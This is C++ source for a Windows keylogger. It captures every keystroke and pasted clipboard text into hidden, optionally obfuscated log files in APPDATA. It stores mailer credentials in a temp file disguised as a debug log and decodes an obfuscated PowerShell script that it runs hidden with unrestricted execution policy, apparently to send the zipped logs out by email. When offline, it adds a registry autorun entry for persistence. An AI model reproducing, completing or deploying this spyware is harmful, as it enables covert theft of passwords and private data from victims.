#include "common.h"

#pragma warning( push )
#pragma warning( disable : 6284 )
#pragma warning( disable : 6387 )
std::set<DWORD> getAllThreadIds();
template <class InputIterator> HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest);
FILE* OUTPUT_FILE;
bool Caps = false;


std::string Log::EncryptMyString(std::string UnencryptedString) {
    std::string CryptedString = {};
    std::string temp;
    std::string ThrowAwayKey;
    ThrowAwayKey += (char)(rand() % KeyShiftLimit + 1);
    for (int r = 0; r < UnencryptedString.size(); r++) {
        *(((CryptedString??(r??)??'CryptedString??(r??)) not_eq 1) ? &CryptedString : &ThrowAwayKey) += (UnencryptedString[r] + (int)ThrowAwayKey[0] + ((UnencryptedString[r] % 2 == 0) ? 1 : 3) + (((int)ThrowAwayKey[0] % 2 == 0) ? 1 : 0));
    }
    Base64::encode(ThrowAwayKey, &temp);
    CryptedString += temp;
    CryptedString += ';';
    return CryptLogs ? CryptedString : UnencryptedString;
}

void Log::LogItInt(int key_stroke) {
    if (key_stroke == 1 || key_stroke == 2)
        return;
    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
        return;

    fopen_s(&OUTPUT_FILE, log.c_str() , "a+");

    //std::cout << key_stroke << std::endl;

    switch (key_stroke) {                                                       //fix OEMX keys by checking for shift and keyb layout
    case VK_OEM_COPY:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[COPY]"));
        break;
    case VK_BACK:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
        break;
    case  13:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
        break;
    case  32:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
        break;
    case  VK_LWIN:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
        break;
    case  9:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
        break;
    case  VK_CAPITAL:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
        Caps = !Caps;
        break;
    case -95:
    case -96:
    case VK_LSHIFT:
    case VK_RSHIFT:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
        break;
    case VK_RCONTROL:
    case VK_LCONTROL:
    case VK_CONTROL:
        if (GetKeyState('V') < 0) {
            fprintf(OUTPUT_FILE, "%s", EncryptMyString("[PASTE]"));
            fprintf(OUTPUT_FILE, "%s", EncryptMyString(GetClipBoardTxt()));
            break;
        }
        if (GetKeyState('C') < 0) {
            fprintf(OUTPUT_FILE, "%s", EncryptMyString("[COPY]"));
            break;
        }
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]"));               //later check for clipboard
        break;
    case  27:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
        break;
    case  VK_END:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
        break;
    case  VK_HOME:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
        break;
    case  VK_INSERT:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[INSERT]"));
        break;
    case  46:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
        break;
    case  37:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
        break;
    case  38:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
        break;
    case  39:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
        break;
    case 40:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
        break;
    /*case VK_OEM_2:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM2( /? )]"));
        break;*/
    case VK_OEM_3:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM3( ]} )]"));
        break;
    case VK_OEM_4:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM4( '\" )]"));
        break;
    case VK_OEM_5:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM5]"));
        break;
    /*case VK_OEM_6:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM6( <> )]"));
        break;*/
    case 190:
    case 110:
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
        break;
    default:
        if ((GetKeyState(VK_SHIFT) < 0) == Caps) {
            if(key_stroke >= 'A' && key_stroke <= 'Z')
                key_stroke += 32;
        }else{
            switch (key_stroke) {
            case 48:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString(")"));
                goto fclose;
            case 49:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("!"));
                goto fclose;
            case 50:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("@"));
                goto fclose;
            case 51:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("#"));
                goto fclose;
            case 52:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("$"));
                goto fclose;
            case 53:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("%"));
                goto fclose;
            case 54:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("^"));
                goto fclose;
            case 55:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("&"));
                goto fclose;
            case 56:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("*"));
                goto fclose;
            case 57:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("("));
                goto fclose;
            case -64:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("~"));
                goto fclose;
            case -67:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("_"));
                goto fclose;
            case -69:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("+"));
                goto fclose;
            case -70:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString(":"));
                goto fclose;
            case -34:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("\""));
                goto fclose;
            case -68:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("<"));
                goto fclose;
            case -66:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString(">"));
                goto fclose;
            case -65:
                fprintf(OUTPUT_FILE, "%s", EncryptMyString("?"));
                goto fclose;
            }
        }
        if (CryptLogs) {
            std::string Temp;
            Temp += (char)key_stroke;
            fprintf(OUTPUT_FILE, "%s", EncryptMyString(Temp));
        }
        else
            fprintf(OUTPUT_FILE, "%s", &key_stroke );
        break;
        
    }
    fclose:
    fclose(OUTPUT_FILE);
}

void Log::LogItChar(std::string Value) {
    Value += "\n";
    std::ofstream File;
    File.open(log, std::ios_base::app);
    File << EncryptMyString(Value);
    File.close();
}

void createLogFile(const std::string& filename, const std::string& line1, const std::string& line2, const std::string& line3) {
	// Create the file with the FILE_ATTRIBUTE_HIDDEN attribute
	HANDLE file = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	// Write the first line to the file
	DWORD writtenBytes;
	WriteFile(file, line1.c_str(), (DWORD)line1.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);

	// Write the second line to the file
	WriteFile(file, line2.c_str(), (DWORD)line2.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);

	// Write the third line to the file
	WriteFile(file, line3.c_str(), (DWORD)line3.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);
	// Close the file
	CloseHandle(file);
}
/*void CompressFile(std::string Path) {
    DWORD WrittenBytes;
    char FileBufferer[1000 + CharactersPerLog];
    std::string FileBuffer;


    std::ifstream InputFile(Path, std::ios::binary);
    while (!InputFile.eof()) {
        std::getline(InputFile, FileBuffer, '\0');
    }
    InputFile.close();
    DeleteFileA(Path.c_str());
    LZ4_compress_default(FileBuffer.c_str(), FileBufferer, FileBuffer.size(), strlen(FileBufferer));
    HANDLE LZ4File = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(LZ4File, FileBufferer, strlen(FileBufferer), &WrittenBytes, NULL);
    CloseHandle(LZ4File);
}*/

void Log::SendLog() {
    SetFileAttributesA(log.c_str(), FILE_ATTRIBUTE_HIDDEN);
    std::string ZipPath = log;
    ZipPath += ".zip";																									// remove or disable this 
    FILE* f = fopen(ZipPath.c_str(), "wb");																				// if you dont want the
    fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);		// log txt file to
    fclose(f);																											// become zipped. 
    const char* files[] = {
        log.c_str()
    };
    {
        CoInitialize(NULL);
        CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
        CoUninitialize();
    }
	char tempPath[MAX_PATH];
	GetEnvironmentVariable("TEMP", tempPath, MAX_PATH);
	std::string fullPath = tempPath;
	fullPath += "\\mat-debug-";
	fullPath += std::to_string(rand() % 10000 + 1000);
	fullPath += ".log";
	createLogFile(fullPath, SendersEmail, SendersPsw, ZipPath);															 //if you want to not zip the file, change to "ZipPath" to "log"
	
	//CompressFile(ZipPath);
    std::string Command = "/C powershell ";
    char SysDir[MAX_PATH];
    GetSystemDirectoryA(SysDir, MAX_PATH);
    DWORD WrittenBytes, DWFlags;
    char* AppData = nullptr;
    size_t AppDataSize;
    strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
    std::string Powershell = AppData;
    Powershell += "\\MagikIndex\\PSScript";
    Powershell += std::to_string(GetTickCount());
    Powershell += ".PS1";
    std::string PSStartup = "MagikMailer";
    PSStartup += std::to_string(GetTickCount());
    HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	std::string a = "$credsPath = \"";
	a += fullPath;
	a += "\"\n";
	a += HardDecode("ShMSZc6XoE9rS\\|zY\\M2pE2nIgnrS\\vHoVw;Yc2H4[x\\pdL7kdxnIfjP4d47WU73GLi2Y\\2nWNn\\5dvXoWMW4[{;oTvCEc2HIW|TY\\{PILi2Y\\2nWNn\\5dvXoWMmEdrHYdHTpexDZ\\UTEMm7Y\\V7{do7YUSTXVVTkEriIfjDHerrHLqSI\\D7{e27Y\\vj4[jTJfD7EdrHYdHTpexDZ\\UTkEpCU\\pHYdLDUenL3Li2FK7T4dE7EdrHYdHTpexDZ\\UTkEpiX\\pHYdLDE\\nT5enXZenLHK8WmWpCURiS5[nro[3PnNunY[vXGf{;IenLHLMmEdrHYdnTEMmTYSw:IXwyYcj3YT2L5dyXoWmqCdrHYdnTEK;CUdxLpTwyYcj3YT2L5dyXoWmqS\\pH4e|XYVunY[P7EdrHYVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiyYcj3YT2L5dyXoWmqSMmL5d5P5ejDJLiyEdrHYdnTEMuHYc27Y\\mXoeFvoexfJfn7mN2XoVw2Y\\2PZgVDEflXock;WN5XoVi2FK|zY[rTpdnTY\\{PmNx\\odLDHXPPHLMWYf{TJLi2FKuP5Wnzo[j7YTw:o\\wnGWW32WmqSM5iVPiyken\\penPHe234WmiEfwXYcuPGe234WwyYcj3mN2XoViS5[nro[R3{fn7GK;C{do7YUSTXVVTkEp24dl7EdrHYdp7Ee234epCURiKZ\\4LZ\\VDHXPPHLMupErWodrzodxTEMi[YcMSZ\\rXZWvCUOiSpd3;4SvCEQwilN66EQi64drT5[n7odxPYN2PZ\\2DURiWodrzodxTkEfL|Y|XodrzILi2FKqTZ[SDZccTkEfH|Y|XodrzILi2FKmL5d5P5ejDJLM2HOdPZ\\wnIdmCURiyYcj3Y\\mqCc2HIW|TY\\{PILiSpdnTpdxPWN2X4Ti2FK|XodrzIL");
	WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
    CloseHandle(PS1File);
    Command = SysDir;
    Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
    Command += Powershell;
    Command += "\"";
    if (!InternetGetConnectedState(&DWFlags, NULL)) {
        CreateRegistryKey(PSStartup.c_str(), Command.c_str());
    }
    else {
        //LogItChar("Connected to the internet, sending the log...", CurrentLog);
        //system(Command.c_str());
        ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
    }
}

void Log::CreateLog() {


    DWORD Tick = GetTickCount();
    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));

    std::string LogTime = std::to_string(Tick);

    std::string CurrentLog = AppData;
    CurrentLog += "\\MagikIndex";

    CreateDirectoryA(CurrentLog.c_str(), NULL);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
	if (CalculateDirSize(CurrentLog) > MaximumFolderLog)
	{
		DeleteDirectory(CurrentLog); //? trying to delete too many logs
		Sleep(200);
		CreateDirectoryA(CurrentLog.c_str(), NULL);
		SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);
	}
    CurrentLog += "\\Log";
    CurrentLog += LogTime;
    CurrentLog += ".txt";
    log = CurrentLog;
}


std::set<DWORD> getAllThreadIds()
{
    auto processId = GetCurrentProcessId();
    auto currThreadId = GetCurrentThreadId();
    std::set<DWORD> thread_ids;
    std::unique_ptr< void, decltype(&CloseHandle) > h(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0), CloseHandle);
    if (h.get() != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (Thread32First(h.get(), &te))
        {
            do
            {
                if (te.dwSize >= (FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)))
                {
                    //only enumerate threads that are called by this process and not the main thread
                    if ((te.th32OwnerProcessID == processId) && (te.th32ThreadID != currThreadId))
                    {
                        thread_ids.insert(te.th32ThreadID);
                    }
                }
                te.dwSize = sizeof(te);
            } while (Thread32Next(h.get(), &te));
        }
    }
    return thread_ids;
}

template <class InputIterator>
HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest)
{
    _COM_SMARTPTR_TYPEDEF(IShellDispatch, IID_IShellDispatch);
    _COM_SMARTPTR_TYPEDEF(Folder, IID_Folder);
    IShellDispatchPtr shell;
    FolderPtr destFolder;

    variant_t dirName, fileName, options;

    HRESULT hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&shell);
    if (SUCCEEDED(hr))
    {
        dirName = dest;
        hr = shell->NameSpace(dirName, &destFolder);
        if (SUCCEEDED(hr))
        {
            auto existingThreadIds = getAllThreadIds();
            options = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;  //NOTE:  same result as 0x0000
            while (first != last)
            {
                fileName = *first;
                printf("Copying %s to %s ...\n", *first, dest);
                ++first;
                hr = destFolder->CopyHere(fileName, options); //NOTE: this appears to always return S_OK even on error

                auto updatedThreadIds = getAllThreadIds();
                std::vector<decltype(updatedThreadIds)::value_type> newThreadIds;
                std::set_difference(updatedThreadIds.begin(), updatedThreadIds.end(), existingThreadIds.begin(), existingThreadIds.end(), std::back_inserter(newThreadIds));

                std::vector<HANDLE> threads;
                for (auto threadId : newThreadIds)
                    threads.push_back(OpenThread(SYNCHRONIZE, FALSE, threadId));

                if (!threads.empty())
                {
                    // Waiting for new threads to finish not more than 5 min.
                    WaitForMultipleObjects((DWORD)threads.size(), &threads[0], TRUE, 5 * 60 * 1000);

                    for (size_t i = 0; i < threads.size(); i++)
                        CloseHandle(threads[i]);
                }
            }
        }
    }
    return hr;
}

std::string GetClipBoardTxt() {
    LPSTR lpstr;
    HGLOBAL hglb;
    char ClipBuffer[10000];
    if (!IsClipboardFormatAvailable(CF_TEXT))
        return "\nError retrieving clipboard format (the copied data wasn't text).\n";
    if (!OpenClipboard(NULL))
        return "\nError opening clipboard.\n";
    hglb = GetClipboardData(CF_TEXT);
    if (hglb != NULL)
    {
        lpstr = (LPSTR)GlobalLock(hglb);
        if (lpstr != NULL)
        {
            strcpy_s(ClipBuffer,sizeof(ClipBuffer),(char*)hglb);
            GlobalUnlock(hglb);
        }
    }
    CloseClipboard();
    std::string Ret = ClipBuffer;
    Ret += '\0';
    return Ret;
}
